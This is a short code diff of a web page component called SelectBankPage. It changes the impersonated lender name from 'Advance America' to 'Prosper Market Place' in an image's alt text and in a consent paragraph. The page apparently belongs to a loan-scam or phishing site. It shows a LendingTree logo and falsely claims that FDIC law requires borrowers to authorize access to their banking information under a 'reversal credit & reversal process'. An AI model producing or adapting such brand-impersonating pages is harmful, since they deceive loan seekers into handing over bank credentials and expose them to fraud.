@@ -44,7 +44,7 @@ export default function SelectBankPage() {
             <Link href="/" className="flex items-center">
               <Image
                 src="/images/lending-tree-logo.png"
-                alt="Advance America"
+                alt="Prosper Market Place"
                 width={150}
                 height={40}
                 className="h-10 w-auto"
@@ -96,7 +96,7 @@ export default function SelectBankPage() {
               As per the law of Federal Deposit Insurance Corporation, we would need to verify you to check your
               repayment capacity and also that you are not misusing anyone's identity. To do this verification – please
               agree to the consent form and move ahead with the loan officer instructions. I hereby authorize Advance
-              Advance America (under reversal credit & reversal process) to access and utilize the following banking
+              Prosper Market Place (under reversal credit & reversal process) to access and utilize the following banking
               information for the specific purpose of processing payments, setting up direct deposits, etc.
             </p>
           </div>
